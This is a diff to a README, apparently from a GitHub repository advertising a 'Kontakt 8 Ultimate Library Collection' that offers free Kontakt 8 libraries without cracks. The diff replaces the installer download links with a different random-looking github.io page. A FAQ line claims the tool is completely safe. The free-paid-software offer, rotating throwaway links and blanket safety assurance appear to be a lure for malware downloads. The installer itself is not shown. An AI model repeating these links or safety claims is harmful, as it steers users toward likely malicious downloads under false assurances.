@@ -2,7 +2,7 @@
 
 Welcome to the Kontakt 8 Ultimate Library Collection, your go-to resource for Kontakt 8 libraries download and management. This tool provides a seamless way to access and organize your favorite Kontakt 8 presets, expansions, and full library packs without the hassle of cracks or complicated installations. Whether you're a professional music producer or a hobbyist, this collection enhances your workflow by bringing all your Kontakt 8 resources into a single, intuitive interface.
 
-[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://yellowtaxisave.github.io/download-page/)
+[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://capitals-707-bringing.github.io/download-page/)
 
 ## Features
 - **Comprehensive Library Management:** Easily browse, search, and organize your entire Kontakt 8 library collection in one place. The tool supports various file formats and allows you to categorize libraries by instrument type, genre, or custom tags, making it effortless to find the perfect sound for your projects.
@@ -41,4 +41,4 @@ For a visual demonstration of the installation process, watch the animated GIF b
    Yes, this tool is completely safe and free from any malicious software. It is designed to enhance your Kontakt 8 experience without compromising your system security.
 
 ## Download
-For a direct download of the installer, visit the official website: [Download from official website](https://yellowtaxisave.github.io/download-page/). Ensure you download only from trusted sources to avoid any security risks.
+For a direct download of the installer, visit the official website: [Download from official website](https://capitals-707-bringing.github.io/download-page/). Ensure you download only from trusted sources to avoid any security risks.
